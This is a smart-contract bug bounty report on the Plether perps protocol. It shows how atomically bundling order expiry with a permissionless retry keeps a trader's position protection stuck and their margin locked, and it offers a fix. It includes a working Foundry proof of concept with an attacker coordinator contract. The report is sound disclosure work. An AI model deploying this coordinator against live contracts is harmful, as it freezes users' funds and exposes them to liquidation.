# \#97864 [SC-High] Atomic order cleanup and permissionless retryPositionProtectionClose bypasses the MED-9 fix and locks triggered positions

**Submitted on Nov 3rd 2026 at 16:53:16 UTC by @LapLapaBaunty for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97864
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro
The `MED-9` fix (`amendLatchedPositionProtectionCloseLimits`) can be bypassed via atomic transaction bundling, allowing a griefer to keep a trader's position and margin locked in `Triggered`.

Once a position protection triggers, `amendLatchedPositionProtectionCloseLimits()` is the trader's only escape hatch to relax restrictive `closeLimits`: standard management functions (`cancelPositionProtection`, `replacePositionProtection`, `cancelPositionProtectionAndCommitClose`) all require the `Armed` status, and direct closes via `OrderRouter.commitOrder()` revert with `OrderRouter__ProtectionActive` while an active protection exists. However, `amendLatchedPositionProtectionCloseLimits()` can only be called when the protection is `Latched`, whereas `retryPositionProtectionClose()` is completely permissionless and flips the status from `Latched` straight back to `Triggered` using the old, restrictive `closeLimits`.

When a failed or expired close attempt is finalized via `OrderRouter.executeOrder()` or `expireOrder()`, the protocol sets the status to `Latched` and resets `pendingOrderCounts[account]` to `0` synchronously. Because both conditions clear within the same execution frame, a third-party contract can bundle the terminal order cleanup and `retryPositionProtectionClose()` into a single atomic transaction. The protection spends zero blocks in the `Latched` state between transactions, starving EOA traders of any window to amend their limits and locking their position and margin for over an hour (or until carry and price movement force liquidation).

## Vulnerability Details

### 1. Synchronous transition to `Latched` and queue cleanup
When a triggered protection's child close order fails terminally with `ConstraintViolation` (via `OrderRouter.executeOrder`) or `Expired` (via `OrderRouter.expireOrder`), `OrderRouter.settleOrderFromSidecar` (`src/OrderRouter.sol:292-312`) calls `_settleTerminalBounty` (`src/OrderRouter.sol:328`), which invokes `positionProtectionBook.handleFailedProtectionAttempt`:

```solidity
// src/PositionProtectionBook.sol:662-667
delete _attemptProtectionIds[orderId];
if (_isFailedProtectionAttemptReason(reason)) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    emit PositionProtectionCloseAttemptFailed(
        protectionId, orderId, account, reason, protection.executionBountyAssets
    );
    return;
}
```

Right after `_settleTerminalBounty` returns (`src/OrderRouter.sol:305`), `settleOrderFromSidecar` calls `_deleteOrder(orderId, record)` (`src/router/OrderRouterBase.sol:122-141`), unlinking `orderId` from the queues and decrementing `pendingOrderCounts[account]` to `0`.

### 2. Permissionless `retryPositionProtectionClose()` immediately flips status back to `Triggered`
As soon as `executeOrder()` or `expireOrder()` finishes, `OrderRouter`'s transient `nonReentrant` lock is released. In the same transaction, the caller contract can invoke `retryPositionProtectionClose(protectionId)` (`src/PositionProtectionBook.sol:382-406`):

```solidity
// src/PositionProtectionBook.sol:382-405
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 orderId) {
    PositionProtectionRecord storage protection = _protections[protectionId];
    if (protection.account == address(0)) {
        revert IOrderRouterErrors.OrderRouter__ProtectionNotFound(protectionId);
    }
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert IOrderRouterErrors.OrderRouter__ProtectionNotLatched(protectionId);
    }
    ...
    if (orderRouter.pendingOrderCounts(protection.account) != 0) {
        revert IOrderRouterErrors.OrderRouter__ProtectionAccountQueueNotEmpty(protection.account);
    }

    orderId = _commitCloseAttempt(protectionId, protection);
    _recordCloseAttempt(protectionId, protection, orderId);
}
```

`_recordCloseAttempt` (`src/PositionProtectionBook.sol:564-578`) immediately sets `protection.status = Triggered` and increments `pendingOrderCounts[account]` back to `1`, queuing a fresh child order with the same unfillable `_closeLimits[protectionId]`.

### 3. Why the trader cannot recover while `Triggered`
`amendLatchedPositionProtectionCloseLimits()` (`src/PositionProtectionBook.sol:315-328`) requires `status == Latched`:

```solidity
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert IOrderRouterErrors.OrderRouter__ProtectionNotLatched(protectionId);
}
```

While pinned in `Triggered`:
- `amendLatchedPositionProtectionCloseLimits()` reverts with `OrderRouter__ProtectionNotLatched`.
- `cancelPositionProtection()`, `replacePositionProtection()`, and `cancelPositionProtectionAndCommitClose()` revert with `OrderRouter__ProtectionNotArmed`.
- `OrderRouter.commitOrder()` reverts with `OrderRouter__ProtectionActive` (`src/router/OrderLiquidationBatchLogic.sol:313-315`).

Standard EOA traders have no atomic `expireAndAmend` or `executeAndAmend` entry point in the protocol, so they can never catch the `Latched` state between transactions. Even if the trader uses a smart account, a newly retried order committed at `(commitBlock = B, commitTime = T)` cannot be settled in block `B` (`HistoricalPriceUnavailable` at `T`, `SameBlock` in block `B`), cannot be settled after the 15-second `orderSettlementWindow` (`T + 16s .. T + 60s`) without a signed Pyth tick from `(T, T + 15s]`, and cannot be expired via `expireOrder()` until `T + 61s` (`OrderRouter__OrderNotExpired`). A smart-account owner can only attempt to race the caller contract for transaction ordering at the `T + 61s` expiry boundary.

### 4. How `closeLimits` become unfillable in normal trading
A triggered protection naturally hits `ConstraintViolation` without user misconfiguration:
- **Stop-Loss with finite `maxGrossAccountDebitAssets` on a small price gap:** In `CfdOrderPolicyEvaluatorBase._buildCloseAssessment` (`src/CfdOrderPolicyEvaluatorBase.sol:410-416`), `grossAccountDebitAssets` includes `pricePnlPledgeConsumedAssets` (the realized price loss deducted from pledged margin) plus `realizedCarryAssets` and `actionChargeCollectedAssets`. If a trader sets `maxGrossAccountDebitAssets` with a reasonable buffer for their Stop-Loss price and the market gaps slightly past the trigger before execution, `triggerPositionProtection()` succeeds while the close attempt fails with `ConstraintViolation(GrossAccountDebit)`.
- **Carry accrual:** Holding carry increases both `actionChargeAssets` and `grossAccountDebitAssets` over time, pushing finite `maxActionChargeAssets` or `maxGrossAccountDebitAssets` bounds into `ConstraintViolation`.
- **Weekend `oracleFrozen` spread:** Entering the frozen window adds `frozenCloseSpreadBps` (`50 bps`) to the execution spread (`src/CfdOrderPolicyEvaluatorBase.sol:401-403`), jumping `explicitFeesAssets` from `4 bps` to `54 bps` and causing normal `maxExplicitFeesAssets` bounds to fail.

### Recommended Mitigation
Allow the protection owner to update `_closeLimits[protectionId]` while `protection.status` is either `Triggered` or `Latched` (without requiring `pendingOrderCounts(msg.sender) == 0`). Because any currently queued child close order has already snapshotted its `ExecutionBounds` into `OrderLifecycleBook` at commit time (`src/router/OrderLiquidationBatchLogic.sol:657-680`), updating `_closeLimits[protectionId]` while `Triggered` does not affect the in-flight order's policy receipt and ensures the next retry uses the owner's updated limits.

## Impact Details
A third-party caller can freeze a trader's open position and locked margin in `CfdEngine` by looping 60-second expiry and retry cycles. Because the `Triggered -> Latched -> Triggered` state transition happens atomically within a single transaction, EOA traders have no window to call `amendLatchedPositionProtectionCloseLimits()`, and even smart-account traders remain trapped unless they win transaction ordering at the exact 60-second boundary.

While pinned in the `Triggered` state, the trader has no way to exit the position or relax their limits. They are forced to absorb ongoing holding carry costs while sitting exposed to market volatility, turning a recoverable limit check failure into a prolonged lockup and liquidation risk.

Furthermore, this griefing vector costs almost nothing to sustain. `retryPositionProtectionClose()` charges no protocol commit fee and assigns zero execution bounty on retries, so the caller only pays base Arbitrum L2 gas once per 60-second window (`maxExecutionWindowSeconds`) to keep the trader's capital locked.

## References
- `packages/perps/src/PositionProtectionBook.sol` (`amendLatchedPositionProtectionCloseLimits` at `:315-328`, `retryPositionProtectionClose` at `:382-406`, `_recordCloseAttempt` at `:564-578`, `handleFailedProtectionAttempt` at `:637-675`)
- `packages/perps/src/OrderRouter.sol` (`settleOrderFromSidecar` at `:292-312`, `_settleTerminalBounty` at `:314-344`)
- `packages/perps/src/router/OrderRouterBase.sol` (`_deleteOrder` at `:122-141`)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol` (`_validateFreshRequest` at `:313-315`, `_protectionCloseRequest` at `:657-680`)
- `packages/perps/src/CfdOrderPolicyEvaluatorBase.sol` (`_buildCloseAssessment` at `:389-472`)

## Notes
Because of the ongoing war in Ukraine and my active military service, I am in daily danger and carry critical duties on the ground, so I cannot be reachable at any given moment. However, as soon as I am safe and have an opportunity to connect, I will make sure to get in touch and respond (feel free to reach out via Discord if any clarification is needed).

## Link to Proof of Concept

https://gist.github.com/BM-arch/5f51015745b9452abd62cf37f62e4d7e

## Proof of Concept

## Proof of Concept

### Steps to Reproduce
1. `ALICE` opens a `10,000` notional LONG position (`100` lots at `1.00`, pledging `2,000 USDG` margin) and arms a Stop-Loss at `1.10` (`LONG_STOP_LOSS = 110_000_000`) with `maxGrossAccountDebitAssets = 1,020 USDG` (a buffer above the `1,004.40 USDG` total debit at `1.10`).
2. The price gaps by 1% to `1.11` (`GAP_STOP_PRICE = 111_000_000`). `triggerPositionProtection()` succeeds (`1.11 >= 1.10`), moving the protection to `Triggered` and queuing the initial close order (`attemptId`).
3. In the next block, `AtomicRetryCoordinator.executeFailedAttemptAndRetry()` executes `attemptId` (which fails terminally with `ConstraintViolation` because the gross debit at `1.11` exceeds `1,020 USDG`) and immediately calls `retryPositionProtectionClose(protectionId)` in the same transaction. The protection transitions `Triggered -> Latched -> Triggered` atomically (`retryId`), spending zero blocks in `Latched`.
4. During the live retry window, `executeOrder(retryId, ...)` stays `Pending` (`HistoricalPriceUnavailable` at the commit timestamp, `SameBlock` in the commit block, and `HistoricalPriceUnavailable` after the 15-second settlement window), `expireOrder(retryId)` reverts with `OrderRouter__OrderNotExpired` until the 60-second deadline, and all of `ALICE`'s management and exit calls revert.
5. Repeating `AtomicRetryCoordinator.expireAttemptAndRetry()` across 60 consecutive 60-second cycles (`> 1 hour`) keeps `ALICE` locked out of `amendLatchedPositionProtectionCloseLimits()` at every block between transactions, leaving her position and pledged margin trapped while unpaid carry accrues.

### Run Command
Place the test below at `packages/perps/test/perps/spec/trader/PositionProtectionCloseLimitsRetryLock.t.sol` and run:

```bash
forge test --offline --match-path test/perps/spec/trader/PositionProtectionCloseLimitsRetryLock.t.sol --match-test test_AtomicCleanupAndPermissionlessRetry_BlocksCloseLimitAmendmentOverOneHour -vv
```

### Foundry Test (`packages/perps/test/perps/spec/trader/PositionProtectionCloseLimitsRetryLock.t.sol`)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @notice Helper that sequences terminal attempt cleanup and permissionless retry in one transaction.
contract AtomicRetryCoordinator {

    OrderRouter public immutable router;
    IPositionProtectionActions public immutable protectionActions;

    constructor(
        OrderRouter router_,
        IPositionProtectionActions protectionActions_
    ) {
        router = router_;
        protectionActions = protectionActions_;
    }

    function executeFailedAttemptAndRetry(
        uint64 attemptOrderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result, uint64 nextAttemptOrderId) {
        result = router.executeOrder{value: msg.value}(attemptOrderId, pythUpdateData);
        nextAttemptOrderId = protectionActions.retryPositionProtectionClose(protectionId);
    }

    function expireAttemptAndRetry(
        uint64 attemptOrderId,
        uint64 protectionId
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 nextAttemptOrderId) {
        result = router.expireOrder(attemptOrderId);
        nextAttemptOrderId = protectionActions.retryPositionProtectionClose(protectionId);
    }

}

contract PositionProtectionCloseLimitsRetryLockTest is PositionProtectionTest {

    uint256 internal constant GAP_STOP_PRICE = 111_000_000; // 1.11000000 (1% past SL)

    function test_AtomicCleanupAndPermissionlessRetry_BlocksCloseLimitAmendmentOverOneHour() public {
        AtomicRetryCoordinator coordinator = new AtomicRetryCoordinator(OrderRouter(address(router)), protectionActions);

        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        (, uint256 initialLockedMargin,,,,,) = engine.positions(ALICE);
        assertGt(initialLockedMargin, 1980e6, "ALICE initial position margin is pledged in CfdEngine");

        // At 1.10 SL, price loss on 100 lots is 1,000 USDG + 4.40 USDG execution fee = 1,004.40 USDG.
        // ALICE sets maxGrossAccountDebitAssets = 1,020 USDG (a realistic buffer above the 1.10 stop-loss debit).
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxGrossAccountDebitAssets = 1020e6;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        // Market gaps slightly to 1.11 (111_000_000), where price loss is 1,100 USDG > 1,020 USDG limit.
        uint64 attemptId = _triggerAt(protectionId, GAP_STOP_PRICE);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "protection should be Triggered"
        );
        assertEq(router.pendingOrderCounts(ALICE), 1, "initial close attempt is pending");

        PositionProtectionTypes.CloseFinancialLimits memory relaxedLimits =
            PositionProtectionTypes.CloseFinancialLimits({
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max
            });

        // Step 1: In the next block, coordinator atomically executes the failing attempt
        // (ConstraintViolation on GrossAccountDebit) AND calls retryPositionProtectionClose in one transaction.
        bytes[] memory execData = _mockPythUpdateData(GAP_STOP_PRICE);
        (OrderV3Types.ExecutionResult memory firstRes, uint64 retryId) =
            coordinator.executeFailedAttemptAndRetry(attemptId, protectionId, execData);

        assertEq(uint8(firstRes.status), uint8(OrderV3Types.LifecycleStatus.Failed), "attempt 1 fails terminally");
        assertEq(
            uint8(firstRes.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "attempt 1 fails due to GrossAccountDebit ceiling"
        );
        assertGt(retryId, attemptId, "retry order queued in the same transaction");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "status is immediately back in Triggered with zero blocks spent in Latched"
        );
        assertEq(router.pendingOrderCounts(ALICE), 1, "pendingOrderCounts is back to 1");

        // Step 2: Even in the same block or after the 15s settlement window, a smart account
        // cannot settle `retryId` to reach `Latched`:
        uint64 retryCommitTime = _orderRecord(retryId).core.commitTime;
        bytes[] memory sameTimestampData = _mockUniquePythUpdateDataAt(GAP_STOP_PRICE, retryCommitTime, retryCommitTime - 1);
        OrderV3Types.ExecutionResult memory sameTimestampRes = router.executeOrder(retryId, sameTimestampData);
        assertEq(uint8(sameTimestampRes.status), uint8(OrderV3Types.LifecycleStatus.Pending));
        assertEq(
            uint8(sameTimestampRes.pendingReason),
            uint8(OrderV3Types.PendingReason.HistoricalPriceUnavailable),
            "empty (commitTime, min(deadline, block.timestamp)] window stays pending"
        );

        vm.warp(uint256(retryCommitTime) + 1);
        bytes[] memory sameBlockData = _mockUniquePythUpdateDataAt(GAP_STOP_PRICE, retryCommitTime + 1, retryCommitTime);
        OrderV3Types.ExecutionResult memory sameBlockRes = router.executeOrder(retryId, sameBlockData);
        assertEq(uint8(sameBlockRes.status), uint8(OrderV3Types.LifecycleStatus.Pending), "same-block stays pending");
        assertEq(uint8(sameBlockRes.pendingReason), uint8(OrderV3Types.PendingReason.SameBlock));

        // All owner management and exit paths revert while Triggered:
        vm.startPrank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, relaxedLimits);

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualClose);

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(manualClose);

        OrderV3Types.OrderRequest memory adjustPositionReq =
            _boundedOpenRequest(CfdTypes.Side.LONG, CfdTypes.SIZE_QUANTUM, 500e6, 0);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(adjustPositionReq);
        vm.stopPrank();

        // Once past the 15s orderSettlementWindow (e.g. at t + 20s), neither executeOrder nor expireOrder can
        // terminalize retryId until the 60s executionDeadline:
        vm.warp(uint256(retryCommitTime) + 20);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory lateData = _mockUniquePythUpdateDataAt(GAP_STOP_PRICE, retryCommitTime + 20, retryCommitTime);
        OrderV3Types.ExecutionResult memory deadZoneRes = router.executeOrder(retryId, lateData);
        assertEq(
            uint8(deadZoneRes.status), uint8(OrderV3Types.LifecycleStatus.Pending), "dead-zone execute stays pending"
        );
        assertEq(
            uint8(deadZoneRes.pendingReason),
            uint8(OrderV3Types.PendingReason.HistoricalPriceUnavailable),
            "no valid tick in 15s window"
        );
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotExpired.selector);
        router.expireOrder(retryId);

        // Step 3: Sustain the atomic expire + retry cycle across 60 cycles (> 1 hour = 3,660 seconds).
        uint256 startTimestamp = vm.getBlockTimestamp();
        uint64 currentAttemptId = retryId;
        for (uint256 cycle = 0; cycle < 60; ++cycle) {
            uint64 deadline = router.lifecycleBook().orderTiming(currentAttemptId).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);

            (OrderV3Types.ExecutionResult memory expRes, uint64 nextId) =
                coordinator.expireAttemptAndRetry(currentAttemptId, protectionId);
            assertEq(uint8(expRes.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
            currentAttemptId = nextId;

            // At every point between transactions, ALICE cannot amend limits or exit:
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, relaxedLimits);
        }

        uint256 elapsedSeconds = vm.getBlockTimestamp() - startTimestamp;
        assertGt(elapsedSeconds, 1 hours, "position and margin remained locked for over 1 hour");

        (uint256 remainingSize, uint256 lockedMargin,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "ALICE position remains trapped open");
        assertEq(lockedMargin, initialLockedMargin, "ALICE pledged position margin remains locked");
        assertGt(_expectedIndexedCarryAssets(ALICE), 0, "ALICE accrues unpaid carry while locked");
    }

}
```
```
